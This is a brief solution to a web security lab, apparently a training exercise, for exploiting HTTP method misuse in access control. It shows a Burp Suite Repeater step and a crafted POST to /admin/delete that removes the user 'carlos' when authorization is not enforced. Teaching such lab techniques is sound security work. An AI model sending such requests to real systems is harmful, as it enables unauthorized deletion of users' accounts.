\# Solution: HTTP Method misuse



1\. Use Burp Suite → Repeater.

2\. Craft a POST request like:

POST /admin/delete HTTP/1.1

Host: <lab>

Content-Type: application/x-www-form-urlencoded



username=carlos

3\. Send the request.

4\. If access control is not enforced, Carlos will be deleted.



